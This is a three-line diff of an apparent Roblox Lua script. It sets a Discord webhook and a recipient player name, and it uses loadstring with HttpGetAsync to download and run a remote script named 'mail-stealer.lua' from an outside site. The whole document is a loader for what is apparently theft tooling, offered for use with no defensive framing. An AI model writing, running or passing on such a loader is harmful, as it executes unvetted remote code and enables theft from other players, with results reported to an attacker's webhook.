@@ -1,2 +1,3 @@
 getgenv().webhook = "https://discord.com/api/webhooks/0000000000000000000/abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyzabcdefghijklmnop" 
+getgenv().name = "XxXBleedKillerXxX"
 loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
